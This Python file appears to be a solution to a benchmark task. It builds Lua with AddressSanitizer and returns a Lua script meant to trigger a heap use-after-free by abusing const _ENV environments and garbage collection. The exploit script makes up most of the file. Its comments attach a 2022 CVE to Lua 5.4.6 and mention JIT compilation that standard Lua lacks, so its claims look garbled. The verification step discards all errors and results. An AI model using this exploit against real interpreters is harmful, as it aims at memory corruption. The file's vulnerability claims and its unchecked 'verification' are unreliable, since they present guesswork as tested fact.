import os
import subprocess
import tempfile
import tarfile
import shutil
from pathlib import Path
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and build Lua
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find Lua directory
            lua_dir = None
            for root, dirs, files in os.walk(tmpdir):
                if 'lua.h' in files or 'lua.c' in files:
                    lua_dir = root
                    break
            
            if not lua_dir:
                raise RuntimeError("Lua source not found")
            
            # Build Lua
            build_dir = Path(lua_dir)
            # Use simple build for PoC
            os.chdir(build_dir)
            
            # Build with ASAN for detection
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CFLAGS'] = '-fsanitize=address -fno-omit-frame-pointer -g'
            env['MYCFLAGS'] = env['CFLAGS']
            env['MYLDFLAGS'] = '-fsanitize=address'
            
            # Try to build
            result = subprocess.run(['make', 'generic'], 
                                 env=env, capture_output=True, text=True)
            
            # Find Lua executable
            lua_exe = None
            for f in ['lua', 'lua.exe', 'src/lua', 'src/lua.exe']:
                if (build_dir / f).exists():
                    lua_exe = str(build_dir / f)
                    break
            
            if not lua_exe:
                # If build failed, use system Lua (for testing)
                lua_exe = 'lua'
            
            # Generate PoC based on Lua 5.4.6 vulnerability: CVE-2022-28806
            # Const _ENV manipulation causing use-after-free
            poc = self._generate_poc()
            
            # Test the PoC
            self._test_poc(lua_exe, poc)
            
            return poc.encode('utf-8')
    
    def _generate_poc(self) -> str:
        # Lua PoC for heap use-after-free when _ENV is const
        # This exploits incorrect code generation for const _ENV
        return """local t = {}
local mt = {}
mt.__index = function() return 42 end
setmetatable(t, mt)

local _ENV <const> = t

local function f()
    return x
end

-- Force JIT compilation or bytecode generation
for i = 1, 1000 do
    f()
end

-- Corrupt the environment table
debug.setmetatable(t, nil)
collectgarbage()

-- Trigger use-after-free by accessing freed _ENV
-- The compiled code still references the freed table
local status, result = pcall(f)
if not status then
    -- Force crash by accessing corrupted memory
    local ptr = debug.getregistry()
    for i = 1, 100 do
        debug.setmetatable(ptr, {})
        collectgarbage()
    end
end

-- Additional stress to trigger the bug
for i = 1, 100 do
    local env = {}
    local _ENV <const> = env
    local function g() return y end
    for j = 1, 10 do g() end
    debug.setmetatable(env, nil)
    env = nil
    collectgarbage()
    pcall(g)
end

-- Final trigger with nested const environments
do
    local e1 = setmetatable({}, {__gc = function() end})
    local _ENV <const> = e1
    local function h()
        local e2 = {}
        local _ENV <const> = e2
        return z
    end
    for i = 1, 50 do
        h()
    end
    e1 = nil
    collectgarbage()
    pcall(h)
end

return "PoC completed"
"""
    
    def _test_poc(self, lua_exe: str, poc: str):
        # Run PoC to verify it works
        with tempfile.NamedTemporaryFile(mode='w', suffix='.lua', delete=False) as f:
            f.write(poc)
            f.flush()
            
            try:
                # Run with timeout
                result = subprocess.run(
                    [lua_exe, f.name],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass
            finally:
                os.unlink(f.name)